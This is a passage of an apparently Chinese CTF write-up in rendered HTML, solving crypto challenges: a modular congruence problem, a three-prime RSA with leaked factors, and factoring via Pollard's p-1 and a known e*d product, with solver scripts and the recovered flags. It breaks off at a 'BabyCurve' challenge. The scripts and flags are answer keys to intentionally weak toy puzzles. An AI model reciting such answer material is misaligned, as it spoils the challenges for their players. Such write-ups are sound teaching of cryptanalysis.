mathvariant="normal">∣</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">a/d是整数，m/d也是整数，所以，d|b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">m</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">d</span><span class="mord">∣</span><span class="mord mathnormal">b</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>x</mi><mo>+</mo><mo stretchy="false">(</mo><mi>m</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>y</mi><mo>=</mo><mi>b</mi><mi mathvariant="normal">/</mi><mi>d</mi><mtext>，随着</mtext><mi>y</mi><mtext>值变化，</mtext><mi>x</mi><mtext>存在</mtext><mi>d</mi><mtext>个不同余的解，</mtext><mi>d</mi><mtext>个解关于</mtext><mi>m</mi><mi mathvariant="normal">/</mi><mi>d</mi><mtext>同余</mtext></mrow><annotation encoding="application/x-tex">(a/d)*x+(m/d)*y=b/d，随着y值变化，x存在d个不同余的解，d个解关于m/d同余</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">随</span><span class="mord cjk_fallback">着</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">化</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal">m</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">余</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∗</mo><mo stretchy="false">(</mo><mi>b</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mo>+</mo><mi>m</mi><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∗</mo><mo stretchy="false">(</mo><mi>b</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mo>=</mo><mi>d</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>b</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mo>=</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">ax&#x27;*(b/d)+my&#x27;*(b/d)=d*(b/d)=b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>可以看到</mtext><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∗</mo><mo stretchy="false">(</mo><mi>b</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mtext>是方程的解，但它可能是负数，加个数即可</mtext></mrow><annotation encoding="application/x-tex">可以看到x&#x27;*(b/d)是方程的解，但它可能是负数，加个数即可</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">看</span><span class="mord cjk_fallback">到</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">程</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">但</span><span class="mord cjk_fallback">它</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">负</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>最终，最小整数解为</mtext><mo stretchy="false">(</mo><mtext>在这里</mtext><mi>m</mi><mo>=</mo><mi>m</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mtext>，</mtext><mo stretchy="false">(</mo><mi>x</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>b</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mo>+</mo><mi>m</mi><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">最终，最小整数解为(在这里m=m/d)，(x*(b/d)+m)\%m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">终</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">为</span><span class="mopen">(</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mord">%</span><span class="mord mathnormal">m</span></span></span></span></p><p><code>cnss&#123;Subgroup @nd Eucl1d algOrithm 1s eleg4nt.&#125;</code><br />考点<code>同余方程求解</code></p><h2 id="卜算子"><a class="markdownIt-Anchor" href="#卜算子"></a> 🌔 卜算子</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from Crypto.Util.number import *</span></span><br><span class="line"><span class="string">from secret import flag</span></span><br><span class="line"><span class="string">p, q, r = getPrime(512), getPrime(512), getPrime(512)</span></span><br><span class="line"><span class="string">n = p * q * r</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">m = bytes_to_long(flag)</span></span><br><span class="line"><span class="string">c = pow(m, e, n)</span></span><br><span class="line"><span class="string">print(&#x27;p =&#x27;, p)</span></span><br><span class="line"><span class="string">print(&#x27;q =&#x27;, q)</span></span><br><span class="line"><span class="string">print(&#x27;n =&#x27;, n)</span></span><br><span class="line"><span class="string">print(&#x27;c =&#x27;, c)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 12253096079262730693787845304459770181159272160708761390419517461435886798119494973936186382645490774511179747402693066192362104144553287739427091488849987</span></span><br><span class="line"><span class="string">q = 9656184899794050073098614505490788837141112476549205418072011388278372195682566976277132351856116300104728124405389485440262266612903835574949734938773879</span></span><br><span class="line"><span class="string">n = 1068394811940475700113916170772008310607904879176073274337669322446687936907143981238893756179197975634434673229920275765973807209412891205884402965483756254507691419368528133959132303476165747992107800736918701005971552264644185146124560027884795936191839406241406301141310602020436434278421529178345240902508007101551941438277539664839258109542374751444222500079818129540895166090788487787028178055561786822480872065405947357363186718845196587434430898650662917</span></span><br><span class="line"><span class="string">c = 364812620179131273680130240148084836403846027393384913159162092631491386521136431985815726041640268869899250546875572473450702105133851945618590296616284218872409897353796638895758963083075264218372930102765065661636950920355098372841435042642748593167374414989630427181232399218196685772309403529745406119979371226428026631723070867224675860939203796555567951762311063010081727524747799375832842589314306700599116049075415601108806973017635507910763925927172362</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">r = n//p//q</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><p><code>cnss&#123;1t is similar to two-prime RSA....&#125;</code><br />考点<code>最基本的RSA</code></p><h2 id="fun_factoring"><a class="markdownIt-Anchor" href="#fun_factoring"></a> 🐠 Fun_factoring</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag1, flag2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    primes = []</span><br><span class="line">    p = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(primes) &lt; <span class="number">100</span>:</span><br><span class="line">        p = next_prime(p)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(p))</span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line">primes = init()</span><br><span class="line">p1 = getPrime(<span class="number">256</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q1 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> q1.bit_length() &lt; <span class="number">255</span>:</span><br><span class="line">        q1 *= random.choice(primes)</span><br><span class="line">    q1 = q1 + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(q1):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">n1 = p1 * q1</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m1 = bytes_to_long(flag1)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c1 = &#125;</span>&#x27;</span>)</span><br><span class="line">m2 = bytes_to_long(flag2)</span><br><span class="line">p2 = getPrime(<span class="number">256</span>)</span><br><span class="line">q2 = getPrime(<span class="number">256</span>)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n2)</span><br><span class="line">phi = (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">e2 = getPrime(<span class="number">256</span>)</span><br><span class="line">d2 = inverse(e2, phi)</span><br><span class="line">hint1 = getPrime(<span class="number">256</span>) * n2</span><br><span class="line">hint2 = e2 * d2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;hint1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;hint2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 29993156790273796411588637755401407649619741972315831791586727944419911570896819043688187483218756247767784823799572993962152654560761989054087817767687901</span></span><br><span class="line"><span class="string">c1 = 28308885699728621592812918494757273712938007912315485487807230648420711341284570451708049371754826651903406663574768899937862287581243099737368091309807825</span></span><br><span class="line"><span class="string">c2 = 3677242432073556679040222440039877927024312077564452145956625214187804614184186227277646425370459616386984491952553180136037741092781602470053045143802537</span></span><br><span class="line"><span class="string">hint1 = 397340046977096077577115578026599912881304442662450049334426974861677656259439266980515145452369301652618056238525786266286451780972189318240092026572582216328286841448920434798083168400087303822060653407466964485682775061825982767</span></span><br><span class="line"><span class="string">hint2 = 42319976894927564843833810567252442522907372281560684051129782019144211533194692653447095916384084531450449319697685128778953472384491084162072476640254892049041007337641419872550411941455264025858397584349456909103991157799852081</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poolard_p_1</span>(<span class="params">N</span>):</span><br><span class="line">    a, n = <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">        res = GCD(a-<span class="number">1</span>, N)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">            q = N // res</span><br><span class="line">            <span class="keyword">return</span> res, q</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getpq</span>(<span class="params">n, ed</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = ed - <span class="number">1</span></span><br><span class="line">        g = random.randint(<span class="number">0</span>, n)</span><br><span class="line">        <span class="keyword">while</span> k % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            k = k//<span class="number">2</span></span><br><span class="line">            temp = <span class="built_in">pow</span>(g, k, n)-<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> GCD(temp, n) &gt; <span class="number">1</span> <span class="keyword">and</span> temp != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> GCD(temp, n), n//GCD(temp, n)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">hint1 = </span><br><span class="line">hint2 = </span><br><span class="line"><span class="comment"># p, q = </span></span><br><span class="line">p, q = Poolard_p_1(n1)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">flag1 = long_to_bytes(<span class="built_in">pow</span>(c1, d, n1))</span><br><span class="line">n2, r = getpq(hint1, hint2)</span><br><span class="line">p, q = getpq(n2, hint2)</span><br><span class="line"><span class="built_in">print</span>(p*q == n2)</span><br><span class="line"><span class="built_in">print</span>(p*q == r)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">flag2 = long_to_bytes(<span class="built_in">pow</span>(c2, d, n2))</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br></pre></td></tr></table></figure><p><code>q1-1</code>是光滑数(可以分解为小素数乘积的正整数)，可以用<code>Pollard's p-1</code>算法分解<code>n1</code>，这里数比较小，也可以直接分</p><p><code>hint2 = e2 * d2</code>，想起了，知道<code>e*d,n</code>可以分解<code>n</code><br /><img src="https://picx.zhimg.com/80/v2-54c76534bf4e9c1e82b0b1023c05daa8_1440w.png" alt="" /><br />那么，同理，是否可以用<code>hint2</code>分解<code>hint1</code>呢？答案是可以的<br />为什么呢？原因很简单，我们满足条件<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mrow><mi>e</mi><mi>d</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>≡</mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g^{ed-1}\equiv 1(mod\ hint1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mclose">)</span></span></span></span><br />即可<br />根据欧拉定理<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>r</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g^{\phi (n_{2})*(r-1)}\equiv 1(mod\ hint1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0824399999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span><span class="mbin mtight">∗</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>而，</mtext><mi>e</mi><mi>d</mi><mo>−</mo><mn>1</mn><mo>=</mo><mi>k</mi><mi>ϕ</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mtext>，测试可知，</mtext><mi>k</mi><mo>&gt;</mo><mo>&gt;</mo><mi>r</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">而，ed-1=k\phi(n_{2})，测试可知，k&gt;&gt;r-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">而</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">测</span><span class="mord cjk_fallback">试</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span><br />所以也可以满足</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b<span class="string">&#x27;cnss&#123;1f_y0u_Kn0w_Pollard_y0u_Kn0w_1t_4ll&#125;&#x27;</span></span><br><span class="line">b<span class="string">&#x27;cnss&#123;Factoring_the_modulus_1s_FUn_fuN_Fun_f0r_The_whOLe_F4miLY!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>考点<code>Pollard's p-1算法，通过e*d分解n</code></p><h2 id="babycurve"><a class="markdownIt-Anchor" href="#babycurve"></a> 🦢 BabyCurve</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher 